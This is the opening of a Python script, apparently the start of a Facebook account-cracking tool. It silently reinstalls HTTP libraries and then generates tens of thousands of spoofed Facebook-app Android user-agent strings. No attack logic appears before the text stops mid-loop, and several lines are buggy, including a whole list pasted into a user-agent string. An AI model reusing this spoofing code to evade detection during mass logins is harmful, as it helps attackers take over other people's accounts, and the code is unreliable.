#CODE BY ACIL 
import os
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system("clear")
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import bs4
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall bs4\n")
    os.system("pip install bs4")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random, base64, subprocess, uuid
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from rich import print as prints
from time import time as mek
from rich.tree import Tree

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
A = '\x1b[1;90m' # WARNA ABU ABU

ugen=[]
for xd in range(10000):
	rr = random.randint
	application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
	application_version_code=str(random.randint(000000000,999999999))
	android_version=str(random.randrange(3,13))         
	gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
	uah = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {gt} Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.{str(rr(1000,9999))}.{str(rr(100,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.49.121;]"
	uih = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,13))}; en-us; {gt} Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/{str(rr(10,99))}.0.0.27.114;]"
	ueh = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {gt} Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.36.124;]"
	uoh = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {gt} Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.{str(rr(1000,9999))}.{str(rr(10,99))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.27.214;]"
	uaku3 = random.choice([uah,uih,ueh,uoh])
	ugen.append(uaku3)
	
for xd in range(10000):
	rr = random.randint
	op = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
	peh = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {op} Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.36.124;]"
	pah = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {op} Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,999))}.0.{str(rr(1000,9999))}.{str(rr(100,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.1.0.29.112;]"
	pih = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {op} Build/QKQ1.190918.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,999))}.0.{str(rr(1000,9999))}.{str(rr(100,999))} Mobile Safari/537.36 [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/{str(rr(3,13))};FBAV/{str(rr(1,9))}.12.3;FBLC/zh_TW]"
	puh = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {op} Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.{str(rr(1000,9999))}.{str(rr(10,99))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.47.119;]"
	uaku3 = random.choice([peh,pah,pih,puh])
	ugen.append(uaku3)
	
for xd in range(10000):
	rr = random.randint
	viv = random.choice(["vivo 1938","vivo NEX S","vivo 1809","Vivo 1605","vivo 1730","vivo_1820","vivo 1835","vivo 1914","vivo 2010","vivo 2019","vivo 2023","vivo 3969","vivo 2027","vivo NEX A","V2020A","Vivo Y5","V2127"])
	ha = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {viv} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.{str(rr(1000,9999))}.{str(rr(100,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.35.70;]"
	hi = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {viv} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,999))}.0.{str(rr(1000,9999))}.{str(rr(100,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.26.115;]"
	hu = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {viv} Build/MMB38M; wv) AppleWebKit/547.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.{str(rr(1000,9999))}.{str(rr(100,999))} Mobile Safari/547.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.41.126;]"
	he = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {viv} Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,999))}.0.{str(rr(1000,9999))}.{str(rr(100,999))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.1.0.28.104;]"
	uaku3 = random.choice([ha,hi,hu,he])
	ugen.append(uaku3)
	
for xd in range(10000):
		rr = random.randint
		na = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,13))}; vivo 1820 Build/O11019) [FBAN/MessengerLite;FBAV/{str(rr(40,367))}.0.0.4.139;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(000000000,999999999))};FBCR/Indosat Ooredoo;FBMF/vivo;FBBD/vivo;FBDV/vivo 1820;FBSV/{str(rr(3,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"	
		ni = f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,13))}; CPH1717 Build/N4F26M) [FBAN/MessengerLite;FBAV/{str(rr(40,367))}.0.0.4.46;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{str(rr(000000000,999999999))};FBCR/Indosat Ooredoo;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1717;FBSV/{str(rr(3,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=,width=};]"
		uaku3 = random.choice([na,ni])
		ugen.append(uaku3)
		
for xd in range(10000):
	rr = random.randint
	uah = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,13))}; es-us; GT-S7562C Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/94.0.0.17.68;]"
	uih = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {gt}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,99))}.0.{str(rr(1000,9999))}.{str(rr(100,999))} Mobile Safari/537.36"
	ueh = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,13))}; it-it; {gt} Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/it_IT;FBAV/{str(rr(10,99))}.0.0.{str(rr(10,99))}.{str(rr(100,999))};]"
	uoh = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,13))}; pt-pt; {gt} Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/{str(rr(10,99))}.0.0.{str(rr(1,9))}.{str(rr(100,999))};]"
	uaku3 = random.choice([uah,uih,ueh,uoh])
	ugen.append(uaku3)
	
for xd in range(10000):
	rr = random.randint
	pt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
	pa = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {gt} Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(3,13))}.0.0.0 Safari/537.36"
	pi = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,13))}; pt-pt; {pt} Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/{str(rr(10,99))}.0.0.{str(rr(10,99))}.{str(rr(100,999))};]"
	pu = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {pt} Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.{str(rr(1000,9999))}.{str(rr(10,99))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(100,999))}.0.0.39.113;]"
	pe = f"Mozilla/5.0 (Linux; Android {str(rr(3,13))}; {pt} Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,99))}.0.{str(rr(1000,9999))}.{str(rr(10,99))} Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/{str(rr(100,999))}.0.0.16.105;]"
	uaku3 = random.choice([pa,pi,pu,pe])
	ugen.append(uaku3)
	
for xd in range(10000):
	rr = random.randint
	tt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
